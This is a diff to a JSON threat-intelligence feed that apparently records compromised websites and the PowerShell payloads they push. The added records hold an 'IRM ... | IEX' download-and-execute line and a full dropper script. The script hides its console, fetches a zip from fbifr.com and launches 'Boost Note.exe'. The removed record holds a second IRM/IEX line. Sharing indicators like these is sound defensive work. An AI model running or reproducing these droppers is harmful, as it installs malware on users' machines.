@@ -1,5 +1,51 @@
 [
   {
+    "UrlDomain": "balifusarongs.com",
+    "DeliveryUrl": [
+      "biboiboboorl.org"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "192.185.136.163"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
+    ],
+    "ReportId": "cmwijm8za0zxz0omlgbyn6tef",
+    "ScannedAt": "2026-11-16T00:46:26.607000+00:00"
+  },
+  {
+    "UrlDomain": "exploratlantico.com",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "147.93.42.88"
+    ],
+    "Related": [
+      {
+        "Value": "https://fbifr.com/ca.js",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwijlxrh0zwy0omlmlk3hhqx",
+    "ScannedAt": "2026-11-16T00:46:11.976000+00:00"
+  },
+  {
     "UrlDomain": "hospitaldebertioga.com.br",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -10136,22 +10182,5 @@
     ],
     "ReportId": "cmw9zizln07hd0oml2za1wlqb",
     "ScannedAt": "2026-11-10T01:01:52.755000+00:00"
-  },
-  {
-    "UrlDomain": "2taxi.ir",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "213.108.240.86"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmw9xznov07gc0omlfempg6ha",
-    "ScannedAt": "2026-11-10T00:18:51.233000+00:00"
   }
 ]
